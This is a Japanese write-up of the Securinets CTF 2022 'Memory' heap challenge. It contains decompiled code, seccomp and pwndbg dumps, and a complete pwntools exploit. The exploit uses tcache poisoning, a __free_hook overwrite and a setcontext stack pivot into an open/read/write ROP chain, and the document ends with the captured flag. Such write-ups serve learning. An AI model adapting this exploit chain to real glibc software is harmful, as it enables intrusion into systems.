## Memory

> Points: 944
>
> Solves: 26

### Description:
Memory is love!

nc 20.216.39.14 1235

https://drive.google.com/file/d/1_ZZmFWxE3SHuezNz9nOirl3RNNbgCHzF/view


### C code:
```
void main(void)

{
  undefined4 uVar1;
  
  count = (undefined4 *)malloc(4);
  *count = 0;
  init_buffering();
  sandbox();
  puts("Memory can be easily accessed !");
  do {
    menu();
    printf(">> ");
    uVar1 = read_int();
    switch(uVar1) {
    case 1:
      dread();
      break;
    case 2:
      dwrite();
      break;
    case 3:
      dallocate();
      break;
    case 4:
      dfree();
      break;
    case 5:
      dview();
      break;
    case 6:
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
  } while( true );
}
```
## Analysis:

dread()は任意のアドレスのデータを8バイト表示する。

dwrite()は任意のアドレスに8バイトのデータを書き込む。

dallocate()は任意のサイズのchunkをmallocして、mallocしたサイズ-8のデータをヒープに書き込むことができる。nullで終端されない。

dree()はptrが指すchunk（最後にmallocしたチャンク）をフリーする。

dview()はptrが指すchunk（最後にmallocしたチャンク）のデータを表示する。

```
void sandbox(void)

{
  undefined8 uVar1;
  long in_FS_OFFSET;
  uint local_34;
  undefined4 local_28 [6];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  uVar1 = seccomp_init(0);
  local_28[0] = 0;
  local_28[1] = 1;
  local_28[2] = 2;
  local_28[3] = 10;
  local_28[4] = 0xe7;
  for (local_34 = 0; local_34 < 5; local_34 = local_34 + 1) {
    seccomp_rule_add(uVar1,0x7fff0000,local_28[(int)local_34],0);
  }
  seccomp_load(uVar1);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

seccomp-toolsの結果は下記になります。

read, write, open, mprotect, exit_group以外のシステムコールを禁止する。
```
$ seccomp-tools dump ./memory
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

memoryを起動した時のフリーchunkの状態は下記になります。
多くのchunkが最初からフリーされていることがわかります。
```
pwndbg> bins
tcachebins
0x20 [  7]: 0x55555555aff0 —▸ 0x55555555b2a0 —▸ 0x55555555a770 —▸ 0x55555555ae50 —▸ 0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0
0x70 [  7]: 0x55555555a9b0 —▸ 0x55555555ab50 —▸ 0x55555555acf0 —▸ 0x55555555ae90 —▸ 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0
0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸ 0x55555555add0 —▸ 0x55555555af70 —▸ 0x55555555b220 —▸ 0x55555555a660 ◂— 0x0
0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸ 0x555555559800 —▸ 0x555555559370 ◂— 0x0
0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0
fastbins
0x20: 0x55555555a4b0 —▸ 0x55555555a5c0 —▸ 0x55555555a8e0 —▸ 0x55555555a980 —▸ 0x55555555ab20 ◂— ...
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x55555555b2b0 —▸ 0x55555555a4d0 —▸ 0x55555555a5e0 —▸ 0x55555555a7f0 —▸ 0x55555555aef0 ◂— ...
0x80: 0x55555555a540 —▸ 0x55555555a860 ◂— 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

BSS領域は下記になります。
```
pwndbg> x/80gx 0x555555558000
0x555555558000:	0x0000000000000000	0x0000555555558008
0x555555558010:	0x0000000000000000	0x0000000000000000
0x555555558020 <stdout@@GLIBC_2.2.5>:	0x00007ffff7f8c6a0	0x0000000000000000
0x555555558030 <stdin@@GLIBC_2.2.5>:	0x00007ffff7f8b980	0x0000000000000000
0x555555558040 <stderr@@GLIBC_2.2.5>:	0x00007ffff7f8c5c0	0x0000000000000000
0x555555558050 <count>:	0x00005555555592a0	0x000055555555b330　　　<- ptr変数
0x555555558060:	0x0000000000000000	0x0000000000000000
0x555555558070:	0x0000000000000000	0x0000000000000000
```

## Solution:

dwrite()を使用して、tcachebinsのリンクを置き換えることで、比較的容易にlibcアドレスの取得と__free_hookの書き換えができる。
dallocate()でnull終端してないのでヒープアドレスのリークも簡単にできる。
seccompでシステムコールが制限されているので、setcontext関数などを試みたが、使えるROPガジェットがなかなか見つからなかった。
`mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];`とsetcontext関数のROPガジェットを用いることでヒープメモリをスタックにしてROPにすることができた。


ヒープアドレスのリークはtcachebinsにリンクされているchunkのアドレスをリークできるので、0x10サイズのchunkをdallocate()して、"\n"のみデータとして書き込み、その後にdview()するとヒープアドレスの上位7バイトをリークできる。
```
$ ./memory
Memory can be easily accessed !
1) read
2) write
3) allocate
4) free
5) view
6) exit
>> 3
size: 
>> 16
data: 
>> 
1) read
2) write
3) allocate
4) free
5) view
6) exit
>> 5

�UUUU　　<- ヒープアドレスのリーク
```



```
pwndbg> bins
tcachebins
0x20 [  6]: 0x55555555b2a0 —▸ 0x55555555a770 —▸ 0x55555555ae50 —▸ 0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0
0x70 [  7]: 0x55555555a9b0 —▸ 0x55555555ab50 —▸ 0x55555555acf0 —▸ 0x55555555ae90 —▸ 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0
0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸ 0x55555555add0 —▸ 0x55555555af70 —▸ 0x55555555b220 —▸ 0x55555555a660 ◂— 0x0
0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸ 0x555555559800 —▸ 0x555555559370 ◂— 0x0
0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0
```


dwrite()を用いて0xf0のtcacheのフリーchunkを0x55555555a390から0x55555555aef0に変更する。
0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555a390 ◂— 0x0
　　　　　　　　　　　　　　　
0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555aef0 ◂— 0x0


0x55555555b070:	0x000055555555b1b0	0x000055555555ae90
0x55555555b080:	0x0000000000000000	0x0000000000000000
0x55555555b090:	0x0000000000000000	0x00000000000000f1
0x55555555b0a0:	0x000055555555aef0	0x0000555555559010
　　　　　　　　~~~~~~~~~~~~~~~~~~　　
0x55555555b0b0:	0x0000000000000000	0x0000000000000000
0x55555555b0c0:	0x0000000000000000	0x0000000000000000
0x55555555b0d0:	0x0000000000000001	0x0000000000000035
0x55555555b0e0:	0x0000000000000000	0x0000000000000000

pwndbg> bins
tcachebins
0x20 [  6]: 0x55555555b2a0 —▸ 0x55555555a770 —▸ 0x55555555ae50 —▸ 0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0
0x70 [  7]: 0x55555555a9b0 —▸ 0x55555555ab50 —▸ 0x55555555acf0 —▸ 0x55555555ae90 —▸ 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0
0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸ 0x55555555add0 —▸ 0x55555555af70 —▸ 0x55555555b220 —▸ 0x55555555a660 ◂— 0x0
0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸ 0x555555559800 —▸ 0x555555559370 ◂— 0x0
0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555aef0 ◂— 0x0



0x55555555ae70:	0x000055555555acc0	0x000055555555b000
0x55555555ae80:	0x0000000000000020	0x0000000000000070
0x55555555ae90:	0x000055555555b030	0x0000555555559010
0x55555555aea0:	0xffffffff00000000	0xffffffff00000000
0x55555555aeb0:	0x000100010000ffff	0x0000000000000000
0x55555555aec0:	0x00000000fd929108	0x0000000000000000
0x55555555aed0:	0x000055555555b030	0x000055555555acf0
0x55555555aee0:	0x0000000000000000	0x0000000000000000
0x55555555aef0:	0x0000000000000000	0x0000000000000071
0x55555555af00:	0x00007ffff7f8bc40	0x000055555555ad50
0x55555555af10:	0xffffffffffffffff	0xffffffffffffffff
0x55555555af20:	0x0000000100000000	0x0000000000000000
0x55555555af30:	0x0000000093507296	0x0000000000000000
0x55555555af40:	0x0000000000000000	0x0000000000000000
0x55555555af50:	0x0000000000000000	0x0000000000000000
0x55555555af60:	0x0000000000000070	0x0000000000000080
0x55555555af70:	0x000055555555b220	0x0000555555559010
0x55555555af80:	0x0000000000000003	0x0000000000000000
0x55555555af90:	0x0000000000000003	0x0000000000000000
0x55555555afa0:	0x0000000000000001	0x0000000000000000
0x55555555afb0:	0x0000000000000000	0x0000000000000000
0x55555555afc0:	0x0000000000000000	0x0000000000000000
0x55555555afd0:	0x0000000000000000	0x0000000000000000
0x55555555afe0:	0x0000000000000000	0x0000000000000021
0x55555555aff0:	0x000055555555b20a	0x0000000000000000

pwndbg> bins
tcachebins
0x20 [  6]: 0x55555555b2a0 —▸ 0x55555555a770 —▸ 0x55555555ae50 —▸ 0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0
0x70 [  7]: 0x55555555a9b0 —▸ 0x55555555ab50 —▸ 0x55555555acf0 —▸ 0x55555555ae90 —▸ 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0
0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸ 0x55555555add0 —▸ 0x55555555af70 —▸ 0x55555555b220 —▸ 0x55555555a660 ◂— 0x0
0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸ 0x555555559800 —▸ 0x555555559370 ◂— 0x0
0xf0 [  2]: 0x55555555b0a0 —▸ 0x55555555aef0 ◂— 0x0

0x55555555ae70:	0x000055555555acc0	0x000055555555b000
0x55555555ae80:	0x0000000000000020	0x0000000000000070
0x55555555ae90:	0x0000000000000000	0x0000000000000000
0x55555555aea0:	0x0000000000000000	0x0000000000000000
0x55555555aeb0:	0x0000000000000000	0x0000000000000000
0x55555555aec0:	0x0000000000000000	0x0000000000000000
0x55555555aed0:	0x0000000000000000	0x0000000000000000
0x55555555aee0:	0x0000000000000000	0x00000000000000f1
0x55555555aef0:	0x0000000000000000	0x0000000000000071
0x55555555af00:	0x00007ffff7f8bc40	0x000055555555ad50
0x55555555af10:	0xffffffffffffffff	0xffffffffffffffff
0x55555555af20:	0x0000000100000000	0x0000000000000000
0x55555555af30:	0x0000000093507296	0x0000000000000000
0x55555555af40:	0x0000000000000000	0x0000000000000000
0x55555555af50:	0x0000000000000000	0x0000000000000000
0x55555555af60:	0x0000000000000070	0x0000000000000080
0x55555555af70:	0x000055555555b220	0x0000555555559010
0x55555555af80:	0x0000000000000003	0x0000000000000000
0x55555555af90:	0x0000000000000003	0x0000000000000000
0x55555555afa0:	0x0000000000000001	0x0000000000000000
0x55555555afb0:	0x0000000000000000	0x0000000000000000
0x55555555afc0:	0x0000000000000000	0x0000000000000000
0x55555555afd0:	0x0000000000000000	0x0000000000000000
0x55555555afe0:	0x0000000000000000	0x0000000000000021
0x55555555aff0:	0x000055555555b20a	0x0000000000000000

下記を実行することで、libcのアドレス(0x00007ffff7f8bc40)を取得できる
Alloc(0xe0, "\n")
Alloc(0xe0, "A"*15+"\n")

0x55555555aed0:	0x0000000000000000	0x0000000000000000
0x55555555aee0:	0x0000000000000000	0x00000000000000f1
0x55555555aef0:	0x4141414141414141	0x0a41414141414141
0x55555555af00:	0x00007ffff7f8bc40	0x000055555555ad50
                ~~~~~~~~~~~~~~~~~~
0x55555555af10:	0xffffffffffffffff	0xffffffffffffffff
0x55555555af20:	0x0000000100000000	0x0000000000000000
0x55555555af30:	0x0000000093507296	0x0000000000000000
0x55555555af40:	0x0000000000000000	0x0000000000000000
0x55555555af50:	0x0000000000000000	0x0000000000000000
0x55555555af60:	0x0000000000000070	0x0000000000000080
0x55555555af70:	0x000055555555b220	0x0000555555559010
0x55555555af80:	0x0000000000000003	0x0000000000000000

下記を実行することで、0x80サイズのtcachebinsに(free_hook-0x10)のデータを書き込むことができる。
Free()
Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))

pwndbg> bins
tcachebins
0x20 [  6]: 0x55555555b2a0 —▸ 0x55555555a770 —▸ 0x55555555ae50 —▸ 0x55555555acb0 —▸ 0x55555555ab10 —▸ 0x55555555a6e0 ◂— 0x0
0x70 [  3]: 0x55555555b030 —▸ 0x55555555b1b0 —▸ 0x55555555a700 ◂— 0x0
0x80 [  7]: 0x55555555a910 —▸ 0x55555555aa90 —▸ 0x55555555ac30 —▸ 0x55555555add0 —▸ 0x55555555af70 —▸ 0x7ffff7f8de38 (__attr_list_lock) ◂— 0x0
0xd0 [  5]: 0x55555555a190 —▸ 0x555555559e60 —▸ 0x555555559b30 —▸ 0x555555559800 —▸ 0x555555559370 ◂— 0x0


__free_hookにはseccompでシステムコールが制限されているため、ROPに持ち込む必要があるが、
setcontext関数で使用するレジスタがrdxに変更になっているため、直接は使用できない。
他にはpush rdi; ... ;pop rsp;...;ret; のROPガジェットを探したが、利用できるものはなかった。


下記のサイトを確認したところ、mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];　のROPガジェットとsetcontext関数を利用することで、rspレジスタにヒープのアドレスを設定できるので、ROPを利用できる。
https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/

ROPでは、./flag.txtファイルをopenして、read、writeの順にシステムコールすることで、フラグファイルを読み出すことができる。

下記は、__free_hookにmov rdx, qword ptr [rdi + 8];...のアドレスを設定した状態
0x7ffff7f8de30 <fork_handlers+1552>:	0x0000000000000000	0x0000000000000000
0x7ffff7f8de40 <__after_morecore_hook>:	0x000055555555b2c0	0x00007ffff7ef08b0


下記はヒープにROPを書き込んだ状態
0x55555555b290:	0x0000000000000000	0x0000000000000021
0x55555555b2a0:	0x000055555555a770	0x0000555555559010
0x55555555b2b0:	0x0000000000000001	0x0000000000000211
0x55555555b2c0:	0x4141414141414141	0x4141414141414141
0x55555555b2d0:	0x4141414141414141	0x4141414141414141
0x55555555b2e0:	0x00007ffff7df3f8d	0x4242424242424242
0x55555555b2f0:	0x4242424242424242	0x4242424242424242
0x55555555b300:	0x4242424242424242	0x4242424242424242
0x55555555b310:	0x4242424242424242	0x4242424242424242
0x55555555b320:	0x4242424242424242	0x4242424242424242
0x55555555b330:	0x4242424242424242	0x4242424242424242
0x55555555b340:	0x4242424242424242	0x4242424242424242
0x55555555b350:	0x4242424242424242	0x4242424242424242
0x55555555b360:	0x000055555555b370	0x00007ffff7dc1679
0x55555555b370:	0x00007ffff7de6400	0x0000000000000002
0x55555555b380:	0x00007ffff7dc2b72	0x000055555555b418
0x55555555b390:	0x00007ffff7dc504f	0x0000000000000000
0x55555555b3a0:	0x00007ffff7e020d9	0x00007ffff7dc2b72
0x55555555b3b0:	0x0000000000000000	0x00007ffff7e90b95
0x55555555b3c0:	0x00007ffff7dc504f	0x000055555555d000
0x55555555b3d0:	0x00007ffff7eb8241	0x0000000000000080
0x55555555b3e0:	0x0000000000000000	0x00007ffff7e020d9
0x55555555b3f0:	0x00007ffff7de6400	0x0000000000000001
0x55555555b400:	0x00007ffff7dc2b72	0x0000000000000001
0x55555555b410:	0x00007ffff7e020d9	0x742e67616c662f2e
0x55555555b420:	0x0000000000007478	0x0000000000000000
0x55555555b430:	0x0000000000000000	0x0000000000000000


Exploitコードは下記になります。
```
from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './memory'
context.binary = elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "20.216.39.14"
  PORT = 1235
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
  libc = elf.libc
  
def Read(where):
  s.sendlineafter(">> ", "1")
  s.sendlineafter(">> ", hex(where)) 

def Write(where, data):
  s.sendlineafter(">> ", "2")
  s.sendlineafter(">> ", hex(where)) 
  s.sendlineafter(">> ", hex(data))
  
def Alloc(size, data): 
  s.sendlineafter(">> ", "3")
  s.sendlineafter(">> ", str(size)) 
  s.sendafter(">> ", data)
  
def Free():
  s.sendlineafter(">> ", "4")

def View():
  s.sendlineafter(">> ", "5")

Alloc(0x10, "\n")
View()
heap_leak = u64(s.recv(6)+b"\x00\x00")
heap_base = heap_leak - 0x220a
print("heap_leak =", hex(heap_leak))
print("heap_base =", hex(heap_base))

Alloc(1100, "A"*4)
Free()
Write(heap_base+0x20a0, heap_base+0x1ef0)

# Make 0xf0 size chunk for free() 
Alloc(0x60, "\n")
Alloc(0x60, "\n")
Alloc(0x60, "\n")
Alloc(0x68, p64(0)*11+p64(0xf1))

# libc leak
Alloc(0xe0, "\n")
Alloc(0xe0, "A"*15+"\n")
View()
s.recvuntil("A"*15+"\n")
libc_leak = u64(s.recv(6)+b"\x00\x00")
libc_base = libc_leak - 0x1ecc40
free_hook = libc_base + libc.sym.__free_hook

print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

setcontext   = libc_base + libc.sym.setcontext
mov_rdx_rdi  = libc_base + 0x1518b0 # mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
ret_addr     = libc_base + 0x22679　# ret;
syscall_ret  = libc_base + 0x630d9  # syscall; ret;
pop_rax_ret  = libc_base + 0x47400  # pop rax; ret;
pop_rdi_ret  = libc_base + 0x23b72  # pop rdi; ret;
pop_rsi_ret  = libc_base + 0x2604f  # pop rsi; ret;
pop_rdx_ret  = libc_base + 0x119241 # pop rdx; pop r12; ret;
xchg_eax_edi = libc_base + 0xf1b95  # xchg eax, edi; ret;

# Write __free_hook in tcachebins 
Free()
Alloc(0xe0, b"A"*0x78+p64(0x81)+p64(free_hook-0x10))
pause()

for i in range(5):
  Alloc(0x70, "\n")

# Write ROP chain of Open/Read/Write in heap memory
buf  = b"A"*0x20
buf += p64(setcontext+61)
buf += b"B"*0x78
buf += p64(heap_base + 0x2370) # rsp
buf += p64(ret_addr)           # rcx  
buf += p64(pop_rax_ret)
buf += p64(2)
buf += p64(pop_rdi_ret)
buf += p64(heap_base + 0x2418)
buf += p64(pop_rsi_ret)
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rdi_ret)
buf += p64(0)
buf += p64(xchg_eax_edi)
buf += p64(pop_rsi_ret)
buf += p64(heap_base + 0x4000)
buf += p64(pop_rdx_ret)
buf += p64(0x80)
buf += p64(0)
buf += p64(syscall_ret)
buf += p64(pop_rax_ret)
buf += p64(1)
buf += p64(pop_rdi_ret)
buf += p64(1)
buf += p64(syscall_ret)
buf += b"./flag.txt\x00"
Alloc(0x200, buf)

# Write ROP gadget address(mov rdx, qword ptr [rdi + 8];...) in __free_hook
Alloc(0x70, p64(0)+p64(heap_base+0x22c0)+p64(mov_rdx_rdi))

# Start ROP chain
Free()

s.interactive()
```

実行結果は下記になります。
```
mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Memory$ python3 solve.py r
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Memory/memory'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 20.216.39.14 on port 1235: Done
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Memory/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
heap_leak = 0x564b41f2020a
heap_base = 0x564b41f1e000
libc_leak = 0x7f131dcb4c40
libc_base = 0x7f131dac8000
[*] Switching to interactive mode
Securinets{397b5541d6dacf89123c5a24eea45cb7cc526dade67d4a70}   
```

参考文献：
https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/
